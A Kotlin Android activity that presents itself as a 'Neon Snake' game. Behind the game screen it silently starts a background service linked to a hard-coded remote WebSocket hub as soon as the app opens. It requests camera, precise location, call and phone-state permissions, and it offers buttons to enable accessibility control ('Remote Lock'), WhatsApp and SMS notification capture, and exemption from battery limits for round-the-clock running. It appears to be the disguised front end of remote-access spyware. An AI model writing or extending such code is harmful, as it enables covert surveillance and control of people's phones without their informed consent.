package com.aura.client

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : Activity() {

    private lateinit var snakeView: SnakeGameView
    private lateinit var scoreTextView: TextView
    private lateinit var highScoreTextView: TextView
    private lateinit var statusBadge: TextView
    private lateinit var btnPlayPause: Button

    private val logMessages = mutableListOf<String>()

    private val statusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == AuraService.ACTION_STATUS_UPDATE) {
                val status = intent.getStringExtra(AuraService.EXTRA_STATUS) ?: "Unknown"
                updateStatusBadge(status)
            } else if (intent?.action == AuraService.ACTION_LOG_UPDATE) {
                val log = intent.getStringExtra(AuraService.EXTRA_LOG) ?: ""
                appendLog(log)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Request runtime permissions
        requestPermissionsIfNeeded()

        // Auto-start background Aura service if not started
        startAuraBackgroundServiceSilently()

        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#07090e"))
            setPadding(30, 40, 30, 30)
        }

        // --- TOP BAR: ARCADE BRAND & AURA STATUS / SETTINGS ---
        val topBar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 0, 0, 20)
        }

        val titleLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        }

        val gameTitle = TextView(this).apply {
            text = "🕹️ NEON SNAKE"
            textSize = 20f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#00f3ff"))
        }
        titleLayout.addView(gameTitle)

        statusBadge = TextView(this).apply {
            text = if (AuraService.isConnected) "🟢 Aura Hub Online" else "🟡 Aura Hub Connecting..."
            textSize = 11f
            setTextColor(if (AuraService.isConnected) Color.parseColor("#10b981") else Color.parseColor("#f59e0b"))
            setTypeface(Typeface.MONOSPACE)
        }
        titleLayout.addView(statusBadge)
        topBar.addView(titleLayout)

        // Settings Button (Opens Aura Control Center)
        val btnSettings = Button(this).apply {
            text = "⚙️ AURA HUB"
            setBackgroundColor(Color.parseColor("#1e293b"))
            setTextColor(Color.parseColor("#00f3ff"))
            textSize = 11f
            setTypeface(null, Typeface.BOLD)
            setPadding(24, 12, 24, 12)
            setOnClickListener {
                showAuraSettingsDialog()
            }
        }
        topBar.addView(btnSettings)
        rootLayout.addView(topBar)

        // --- SCORE BAR ---
        val scoreBar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(20, 16, 20, 16)
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        }

        scoreTextView = TextView(this).apply {
            text = "SCORE: 0"
            textSize = 15f
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(Color.WHITE)
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        }
        scoreBar.addView(scoreTextView)

        highScoreTextView = TextView(this).apply {
            text = "BEST: 0"
            textSize = 15f
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(Color.parseColor("#ff007f"))
        }
        scoreBar.addView(highScoreTextView)
        rootLayout.addView(scoreBar)

        // Spacer
        rootLayout.addView(View(this).apply { layoutParams = LinearLayout.LayoutParams(1, 16) })

        // --- GAME CANVAS VIEW ---
        snakeView = SnakeGameView(this).apply {
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f)
            onScoreChangeListener = { score, highScore ->
                scoreTextView.text = "SCORE: $score"
                highScoreTextView.text = "BEST: $highScore"
            }
            onGameStateChangeListener = { state ->
                when (state) {
                    SnakeGameView.GameState.RUNNING -> btnPlayPause.text = "⏸ PAUSE"
                    SnakeGameView.GameState.PAUSED -> btnPlayPause.text = "▶ RESUME"
                    SnakeGameView.GameState.GAME_OVER, SnakeGameView.GameState.READY -> btnPlayPause.text = "▶ START"
                }
            }
        }
        rootLayout.addView(snakeView)

        // --- D-PAD TOUCH CONTROLS ---
        val controlsLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(0, 16, 0, 0)
        }

        // Action Buttons Row (Start / Pause / Restart)
        val actionRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 14)
        }

        btnPlayPause = Button(this).apply {
            text = "▶ START GAME"
            setBackgroundColor(Color.parseColor("#00f3ff"))
            setTextColor(Color.BLACK)
            setTypeface(null, Typeface.BOLD)
            textSize = 13f
            setPadding(30, 14, 30, 14)
            setOnClickListener {
                if (snakeView.gameState == SnakeGameView.GameState.RUNNING) {
                    snakeView.pauseGame()
                } else {
                    snakeView.startGame()
                }
            }
        }
        actionRow.addView(btnPlayPause)

        val btnRestart = Button(this).apply {
            text = "🔄 RESTART"
            setBackgroundColor(Color.parseColor("#1e293b"))
            setTextColor(Color.WHITE)
            textSize = 13f
            setPadding(24, 14, 24, 14)
            setOnClickListener {
                snakeView.resetGame()
                snakeView.startGame()
            }
        }
        actionRow.addView(View(this).apply { layoutParams = LinearLayout.LayoutParams(16, 1) })
        actionRow.addView(btnRestart)
        controlsLayout.addView(actionRow)

        // D-Pad Grid (Up, Left/Right, Down)
        val dPadContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }

        // UP
        val btnUp = createDPadButton("▲") { snakeView.setMoveDirection(SnakeGameView.Direction.UP) }
        dPadContainer.addView(btnUp)

        // LEFT & RIGHT
        val midRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }
        val btnLeft = createDPadButton("◀") { snakeView.setMoveDirection(SnakeGameView.Direction.LEFT) }
        val dpadCenter = View(this).apply { layoutParams = LinearLayout.LayoutParams(60, 50) }
        val btnRight = createDPadButton("▶") { snakeView.setMoveDirection(SnakeGameView.Direction.RIGHT) }
        midRow.addView(btnLeft)
        midRow.addView(dpadCenter)
        midRow.addView(btnRight)
        dPadContainer.addView(midRow)

        // DOWN
        val btnDown = createDPadButton("▼") { snakeView.setMoveDirection(SnakeGameView.Direction.DOWN) }
        dPadContainer.addView(btnDown)

        controlsLayout.addView(dPadContainer)
        rootLayout.addView(controlsLayout)

        setContentView(rootLayout)

        // Initial score update
        highScoreTextView.text = "BEST: ${snakeView.highScore}"
    }

    private fun createDPadButton(label: String, onClick: () -> Unit): Button {
        return Button(this).apply {
            text = label
            textSize = 18f
            setTextColor(Color.parseColor("#00f3ff"))
            setBackgroundColor(Color.parseColor("#0f172a"))
            setTypeface(null, Typeface.BOLD)
            layoutParams = LinearLayout.LayoutParams(110, 56).apply {
                setMargins(4, 4, 4, 4)
            }
            setOnClickListener { onClick() }
        }
    }

    private fun startAuraBackgroundServiceSilently() {
        val prefs = getSharedPreferences("AuraPrefs", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", "ws://10.246.8.197:3000") ?: "ws://10.246.8.197:3000"
        val deviceSlot = prefs.getString("device_slot", "phone_1") ?: "phone_1"
        val customName = prefs.getString("device_name", "${Build.MANUFACTURER.capitalize()} ${Build.MODEL}") ?: "My Phone"

        val serviceIntent = Intent(this, AuraService::class.java).apply {
            putExtra("SERVER_URL", serverUrl)
            putExtra("DEVICE_SLOT", deviceSlot)
            putExtra("DEVICE_NAME", customName)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun showAuraSettingsDialog() {
        val prefs = getSharedPreferences("AuraPrefs", Context.MODE_PRIVATE)
        val savedUrl = prefs.getString("server_url", "ws://10.246.8.197:3000") ?: "ws://10.246.8.197:3000"
        val savedSlot = prefs.getString("device_slot", "phone_1") ?: "phone_1"
        val savedName = prefs.getString("device_name", "${Build.MANUFACTURER.capitalize()} ${Build.MODEL}") ?: "My Android Device"

        val scrollView = ScrollView(this)
        val dialogLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 40, 40, 40)
            setBackgroundColor(Color.parseColor("#07090e"))
        }

        val title = TextView(this).apply {
            text = "⚡ AURA COMMAND HUB SETTINGS"
            textSize = 16f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#00f3ff"))
            setPadding(0, 0, 0, 20)
        }
        dialogLayout.addView(title)

        // Server URL
        dialogLayout.addView(TextView(this).apply {
            text = "Hub WebSocket URL:"
            textSize = 12f
            setTextColor(Color.parseColor("#94a3b8"))
        })
        val ipInput = EditText(this).apply {
            setText(savedUrl)
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(20, 20, 20, 20)
            textSize = 13f
        }
        dialogLayout.addView(ipInput)

        // Device Slot
        dialogLayout.addView(TextView(this).apply {
            text = "Device Slot Identity:"
            textSize = 12f
            setTextColor(Color.parseColor("#94a3b8"))
            setPadding(0, 16, 0, 0)
        })
        val slots = arrayOf("phone_1 (Primary)", "phone_2 (Secondary)")
        val slotSpinner = Spinner(this).apply {
            adapter = ArrayAdapter(this@MainActivity, android.R.layout.simple_spinner_dropdown_item, slots)
            setSelection(if (savedSlot == "phone_2") 1 else 0)
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(16, 16, 16, 16)
        }
        dialogLayout.addView(slotSpinner)

        // Custom Name
        dialogLayout.addView(TextView(this).apply {
            text = "Device Name:"
            textSize = 12f
            setTextColor(Color.parseColor("#94a3b8"))
            setPadding(0, 16, 0, 0)
        })
        val nameInput = EditText(this).apply {
            setText(savedName)
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(20, 20, 20, 20)
            textSize = 13f
        }
        dialogLayout.addView(nameInput)

        // Spacer
        dialogLayout.addView(View(this).apply { layoutParams = LinearLayout.LayoutParams(1, 20) })

        // Reconnect / Save Button
        val btnSave = Button(this).apply {
            text = "💾 SAVE & RESTART SERVICE"
            setBackgroundColor(Color.parseColor("#00f3ff"))
            setTextColor(Color.BLACK)
            setTypeface(null, Typeface.BOLD)
            setOnClickListener {
                val url = ipInput.text.toString().trim()
                val slot = if (slotSpinner.selectedItemPosition == 1) "phone_2" else "phone_1"
                val name = nameInput.text.toString().trim()

                prefs.edit()
                    .putString("server_url", url)
                    .putString("device_slot", slot)
                    .putString("device_name", name)
                    .apply()

                val serviceIntent = Intent(this@MainActivity, AuraService::class.java).apply {
                    putExtra("SERVER_URL", url)
                    putExtra("DEVICE_SLOT", slot)
                    putExtra("DEVICE_NAME", name)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent)
                } else {
                    startService(serviceIntent)
                }
                Toast.makeText(this@MainActivity, "Settings Saved & Service Connected!", Toast.LENGTH_SHORT).show()
            }
        }
        dialogLayout.addView(btnSave)

        // Spacer
        dialogLayout.addView(View(this).apply { layoutParams = LinearLayout.LayoutParams(1, 16) })

        // Permission Buttons
        val btnBattery = Button(this).apply {
            text = "🔋 Disable Battery Saver (24/7 Run)"
            setBackgroundColor(Color.parseColor("#1e3a5f"))
            setTextColor(Color.parseColor("#60a5fa"))
            textSize = 11f
            setOnClickListener { requestIgnoreBatteryOptimization() }
        }
        dialogLayout.addView(btnBattery)

        val btnAccess = Button(this).apply {
            text = "⚙️ Enable Remote Lock (Accessibility)"
            setBackgroundColor(Color.parseColor("#3b2d54"))
            setTextColor(Color.parseColor("#e0b0ff"))
            textSize = 11f
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
        }
        dialogLayout.addView(btnAccess)

        val btnNotif = Button(this).apply {
            text = "🔔 Enable Notification Sync (WhatsApp & SMS)"
            setBackgroundColor(Color.parseColor("#134e4a"))
            setTextColor(Color.parseColor("#2dd4bf"))
            textSize = 11f
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        }
        dialogLayout.addView(btnNotif)

        scrollView.addView(dialogLayout)

        AlertDialog.Builder(this)
            .setView(scrollView)
            .setPositiveButton("Close", null)
            .show()
    }

    @SuppressLint("BatteryLife")
    private fun requestIgnoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } else {
                Toast.makeText(this, "Battery Restrictions already Disabled!", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun updateStatusBadge(status: String) {
        if (status.contains("Connected", ignoreCase = true)) {
            statusBadge.text = "🟢 Aura Hub Online"
            statusBadge.setTextColor(Color.parseColor("#10b981"))
        } else if (status.contains("Connecting", ignoreCase = true)) {
            statusBadge.text = "🟡 Aura Hub Connecting..."
            statusBadge.setTextColor(Color.parseColor("#f59e0b"))
        } else {
            statusBadge.text = "🔴 Aura Hub Offline"
            statusBadge.setTextColor(Color.parseColor("#f43f5e"))
        }
    }

    private fun appendLog(msg: String) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val entry = "[$time] $msg"
        logMessages.add(entry)
        if (logMessages.size > 10) logMessages.removeAt(0)
    }

    private fun requestPermissionsIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val permissions = mutableListOf<String>()
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.CALL_PHONE)
            }
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_PHONE_STATE)
            }
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.CAMERA)
            }
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            if (checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                    permissions.add(Manifest.permission.POST_NOTIFICATIONS)
                }
            }
            if (permissions.isNotEmpty()) {
                requestPermissions(permissions.toTypedArray(), 100)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        val filter = IntentFilter().apply {
            addAction(AuraService.ACTION_STATUS_UPDATE)
            addAction(AuraService.ACTION_LOG_UPDATE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(statusReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(statusReceiver, filter)
        }
        updateStatusBadge(AuraService.currentStatusMessage)
    }

    override fun onPause() {
        super.onPause()
        try {
            unregisterReceiver(statusReceiver)
        } catch (e: Exception) {}
        snakeView.pauseGame()
    }
}
